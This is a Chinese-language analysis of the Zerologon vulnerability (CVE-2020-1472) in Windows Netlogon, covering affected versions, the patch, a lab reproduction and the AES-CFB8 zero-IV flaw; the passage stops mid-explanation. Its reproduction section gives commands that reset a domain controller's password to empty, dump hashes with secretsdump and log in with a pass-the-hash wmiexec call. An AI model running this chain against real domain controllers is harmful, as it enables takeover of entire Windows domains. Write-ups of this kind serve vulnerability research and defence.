
# CVE-2020-1472 Windows Netlogon 权限提升漏洞分析

CVE-2020-1472，也称Zerologon漏洞。该漏洞为微软2020年8月份补丁日例行更新时公开的漏洞，以其10分的CVSS评分在当时引起诸多研究员重视。在近日的活动期间，国外secura公开了针对该漏洞的扫描检测脚本和whitepaper，不久之后互联网中即公开了漏洞利用的完整exp。国内各安全厂商在短时间对该漏洞进行了各种手段的防御，目前尚未发现该漏洞的大范围利用案例。

[toc]

## 一、漏洞信息

### 1. 漏洞简述

- 漏洞名称：Netlogon Elevation of Privilege Vulnerability
- 漏洞编号：CVE-2020-1472
- 漏洞类型：Elevation of Privilege
- 漏洞影响：Elevation of Privilege
- CVSS评分：10
- 利用难度：Medium
- 基础用户：不需要

### 2. 组件概述

Netlogon远程协议是一个远程过程调用（RPC）接口，用于基于域的网络上的用户和计算机身份验证。Netlogon远程协议RPC接口还用于为备份域控制器（BDC）复制数据库。

Netlogon远程协议用于维护从域成员到域控制器（DC），域的DC之间以及跨域的DC之间的域关系。此RPC接口用于发现和管理这些关系。

### 3. 漏洞利用

该漏洞主要是由于在使用Netlogon安全通道与域控进行连接时，由于认证协议加密部分的缺陷，导致攻击者可以将域控管理员用户的密码置为空，从而进一步实现密码hash获取并最终获得管理员权限。成功的利用可以实现以管理员权限登录域控设备，并进一步控制整个域。

### 4. 漏洞影响

- Microsoft Windows Server 2008 R2 SP1
- Microsoft Windows Server 2012
- Microsoft Windows Server 2012 R2
- Microsoft Windows Server 2016
- Microsoft Windows Server 2019
- Microsoft Windows Server version 2004 (Server Core Installation)
- Microsoft Windows Server version 1903 (Server Core Installation)
- Microsoft Windows Server version 1909 (Server Core Installation)

### 5. 解决方案

微软官方针对该漏洞的解决方案分成了2部分：

第1部分，首先发布该漏洞的安全更新补丁，补丁地址：<mark class="encrypted">b6aK9s2c8@1M7s2y4Q4x3@1q4Q4x3V1k6Q4x3V1k6H3L8%4u0@1j5h3I4Q4x3X3g2E0M7%4u0U0i4K6u0W2L8h3W2U0M7X3!0K6L8$3k6@1i4K6u0W2j5$3!0E0i4K6u0r3k6h3&6Q4x3X3c8g2f1#2)9J5c8Y4y4W2j5%4g2J5K9i4c8&6i4K6u0V1k6%4g2A6k6r3q4F1j5$3g2Q4x3V1k6S2k6s2k6A6M7$3!0J5P5g2)9J5c8V1y4h3c8g2)9J5k6o6t1H3x3U0m8Q4x3X3b7I4y4o6M7J5</mark>

第2部分，在2021年的Q1完成对所有加入域的设备（包含非Windows设备）的全面保护。

## 二、漏洞复现

### 1. 环境搭建

- 域控主机name：`ADSrv01`
- 域控ip：`XXXX`

靶机操作：

安装`impacket`：

```
python setup.py install
```

### 2. 漏洞检测

使用公开的检测脚本进行检测：

```
pip install -r requirements.txt
python Scan.py ADSrv01 <IP>
```

检测结果：

（1）存在漏洞

![](upload/attach/202009/779730\_EPZYRSNAC2QXRPN.png)

（2）已安装更新补丁

![](upload/attach/202009/779730\_EBUADS9QZ4S6FYP.png)

### 3. 漏洞利用

同样，使用公开的利用脚本（重置密码为空）进行漏洞利用验证：

```
python poc.py ADSrv01 <IP>
```

运行结果（与检测环境不同，但不影响漏洞利用）：

![](upload/attach/202009/779730\_5HHYCFFQQB2E2KU.png)

然后，使用空密码获取hash：

```
python secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'Domain/DC\_NETBIOS\_NAME$@dc\_ip\_addr'
example：
secretsdump.py -hashes :31d6cfe0d16ae931b73c59d7e0c089c0 'v4ler1an/ADSrv01$@<IP>'
```

这里我使用的powershell，所以会弹出一个cmd，输出hash信息，然后快速关掉，可以使用linux，就会保持窗口不会立刻关闭了：

![](upload/attach/202009/779730\_98KTV6G44YQT345.png)

这里可以拿到`administrator`的密码hash，然后就可以使用hash进行登录了：

```
wmiexec.py -hashes HASH DOMAIN/USERNAME@IP
此处的例子为：
wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:8756481b09eec95190a6663a2dd879ab v4ler1an/adminstrator@<IP>
```

![](upload/attach/202009/779730\_DCFDFJG2DCYEDT8.png)

后续操作：

![](upload/attach/202009/779730\_TBNPRSY6XQM3T2K.png)

## 三、漏洞分析

### 1. 基本信息

- 漏洞文件：`netlogon.dll`
- 漏洞函数：`NetrServerAuthenticate3`等
- 漏洞算法：`AES`

### 2. 背景知识

`Netlogon Remote Protocol`，是在Windows域控上开启的一个RPC接口。它用于执行与用户和计算机身份验证相关的各种task，最常见的是方便用户使用NTLM协议登录服务器。其他功能包括NTP response的身份验证，尤其是可以让计算机在域内更新其密码。 RPC接口可通过TCP（通过域控制器的`portmapper`服务分配的动态端口）或通过端口445上的SMB管道来使用。

该协议并未使用RPC服务的相同的认证策略，它使用了一种密码学协议来让client（域内）和域控的进行client的账户密码hash的确认，使用这种方式的主要原因是在Windows NT时代，计算机账户不再是首选原则，因此就无法使用类似NTLM或者Kerberos之类的标准用户身份验证方案。

Netlogon session初始化由client完成，client和sever会交换随机的8字节随机数（称为`challenges`），然后他们都通过使用密钥派生函数将两个`challenges`与client的账户密码hash混合在一起来计算`session key`。然后，client使用计算得到的`session key`计算得到一个`client credential`。

server重新计算相同的credential，如果与client计算的结果相同，则判定client拥有正确的用户密码以及`session key`，验证通过。其过程大致如下图所示：

![](upload/attach/202009/779730\_7D2EN24C235FN5T.png)

在认证握手阶段，client和server都可以协商是否对subsequent messages进行加密和密码学认证(称为`seal and sign`)，其主要目的是抵御网络层面的攻击者。如果不使用加密，一些执行重要action的Netlogon call仍然会包含一个`authticator`值，该值也是使用`session key`计算获得。

### 3. 详细分析

客户端和服务器用于生成凭据值的加密原语由`ComputeNetlogonCredential()`函数实现，该函数接收一个8字节长度的输入，然后使用`session key`对其进行转换，然后输出8字节长度的数据。这里保证安全性的基本原则是，不知道`session key`的攻击者将无法计算或猜测与某个输入匹配的正确输出，那么也就无法获取可以成功实现认证的credential。

#### 1. 2种credential的算法

在计算credential时可使用的算法有2种：`AES-CFB8`和`2DES`。

**`2DES`**

在使用`2DES`进行计算时，计算`session key`的逻辑如下：

```c
InitLMKey(KeyIn, KeyOut)
KeyOut[0] = KeyIn[0] >> 0x01;
KeyOut[1] = ((KeyIn[0]&0x01)<<6) | (KeyIn[1]>>2);
KeyOut[2] = ((KeyIn[1]&0x03)<<5) | (KeyIn[2]>>3);
KeyOut[3] = ((KeyIn[2]&0x07)<<4) | (KeyIn[3]>>4);
KeyOut[4] = ((KeyIn[3]&0x0F)<<3) | (KeyIn[4]>>5);
KeyOut[5] = ((KeyIn[4]&0x1F)<<2) | (KeyIn[5]>>6);
KeyOut[6] = ((KeyIn[5]&0x3F)<<1) | (KeyIn[6]>>7);
KeyOut[7] = KeyIn[6] & 0x7F;
for( int i=0; i<8; i++ ){
KeyOut[i] = (KeyOut[i] << 1) & 0xfe;
}
```

假设`bytes(s,e,l)`为从字节数组`l`返回，从`s`到`e` 。`session key`计算完成后，credential按照如下逻辑进行计算：

```c
ComputeNetlogonCredential(Input, Sk,
Output)
SET k1 to bytes(0, 6, Sk)
CALL InitLMKey(k1, k3)
SET k2 to bytes(7, 13, Sk)
CALL InitLMKey(k2, k4)
CALL DES\_ECB(Input, k3, &output1)
CALL DES\_ECB(output1, k4, &output2)
SET Output to output2
```

**`AES-CFB8`**

如果client和server之间协商了AES支持，则使用AES-128加密算法使用0初始化矢量在8位CFB模式下计算Netlogon凭据。其计算过程大致如下：

```c
ComputeNetlogonCredential(Input, Sk,
Output)
SET IV = 0
CALL AesEncrypt(Input, Sk, IV, Output)
```

`AesEncrypt`是8位CFB模式下的AES-128加密算法，初始化矢量为0。

具体使用哪种算法，是在进行认证时由client进行相关`flags`的设置。但是，由于现代版本的Windows Server的默认设置都会拒绝使用2DES加密方案，所以大多数的domains都使用AES加密方案。而本次漏洞就产生于这种新发展的加密方案，2DES的旧版加密方案反而没有该漏洞的存在。

#### 2. 存在漏洞的AES-CFB8

基本的AES块密码操作需要16个字节的输入并将其置换为大小相等的输出，为了加密更大或更小的input，需要选择一种`mode of operation`。在`ComputerNetlogonCredential()`函数种，仅需要转换8字节数据，选择了CFB8模式。因为该模式比一般的AES的任何一种模式都要慢大约16倍，所以利用范围很有限，大部分情况下都不会选择使用该模式。

`AES-CFB8`算法的计算过程大致如下：

- 首先，在明文plaintext前面加上16字节长度的`Initialistation Vector`
- 对修改后的`IV+plaintext`进行AES运算，获取其结果的第一个字节
- 使用获取的第1和字节和plaintext的下一个字节进行异或操作

上述过程示意图如下：

![](upload/attach/202009/779730\_NQTG9SCXB9WDCBT.png)

从上面的过程可以看出，为了完成对message的各个字节数据的加密，需要指定一个IV来引导整个过程。IV必须具备唯一性，必须为随机产生，这样对于同一个plaintext才可能产生不同的加密结果。但是，在`ComputeNetlogonCredential()`函数中，该值被设置为了**固定长度、值全为0的16字节数据**。但是，使用全0的IV，就一定会出问题吗？概率很低，但不代表没有概率：**在256个密钥中总是可以找到1个，对全0的plaintext应用AESCFB8加密将导致全0的ciphertext**，其过程如下：

![](upload/attach/202009/779730\_ZAF92ZDNPNCWX4U.png)

也就是说，如果IV和plaintext均为0，那么有256次机会可以找到一个key，使得最后的计算结果也全为0。实际上，此属性比较通用：当IV仅由0组成时，将存在一个0≤X≤255的整数，该整数表示以n字节开头的X值的明文最终被转换成n个值为0的字节开头的密文。X取决于加密密钥，并且是随机分布的。

到此为止，漏洞内容已经明确：一个全0的输入会导致一个全0的输出。

### 4. 利用思路

#### 1. 欺骗client credential

在通过`NetrServerReqChallenge()`函数完成challenges交换后，client会调用`NetrServerAuthenticate3()`函数来进行自身验证，函数原型如下：

```c
NTSTATUS NetrServerAuthenticate3(
[in, unique, string] LOGONSRV\_HANDLE PrimaryName,
[in, string] wchar\_t\* AccountName,
[in] NETLOGON\_SECURE\_CHANNEL\_TYPE SecureChannelType,
[in, string] wchar\_t\* ComputerName,
[in] PNETLOGON\_CREDENTIAL ClientCredential,
[out] PNETLOGON\_CREDENTIAL ServerCredential,
[in, out] ULONG \* NegotiateFlags,
[out] ULONG \* AccountRid
);
```

该函数的`ClientCrendential`参数为一个指向`NETLOGON\_CREDENTIAL`结构的指针，该结构中包含client的credential：

```c
typedef struct \_NETLOGON\_CREDENTIAL {
CHAR data[8];
} NETLOGON\_CREDENTIAL,
\*PNETLOGON\_CREDENTIAL;
```

credential的计算由`ComputeNetlogonCredential()`完成，该函数利用`NetrServerReqChallenge()`函数传来的challenge进行计算，而challenge是完全可以由我们控制的，因此可以设置为8个0。这也就意味着，对于一个正确有效的`ClientCredential`来说，可以在256次机会中计算得到一个全0的`ClientCredential`。

因为server在每次认证请求中也会产生一个server challenge，该值也是session key计算的一个参数，也就是说，对于每次认证请求，session key都是不同的。但是因为计算机并没有做防爆破的机制，登录认证失败后可以一直尝试登录，所以可以进行256次爆破，直到找到正确的key。

#### 2. 绕过signing 和 sealing

虽然通过第一步可以实现身份验证绕过，但是对于Netlogon的传输加密机制（`RPC signing and sealing`）来说，我们不知道session key到底是多少。但是，singing和sealing是可选项，可以通过在`NetrServerAuthenticate3()`函数中取消设置对应的标志位来关闭这2个选项。在现代的client中，默认是拒绝接受未设置这2个flag的server的连接请求的，但是server并不拒绝client的连接请求。所以，我们可以在进行攻击时手动关闭这2个flag。

#### 3. 欺骗调用

即使禁用了加密，每个执行某些敏感操作的函数调用也必须包含一个`Authenticator`值。该值的计算通过使用`ComputeNetlogonCredential(带有会话密钥)`计算`ClientStoredCredential + Timestamp`获得：
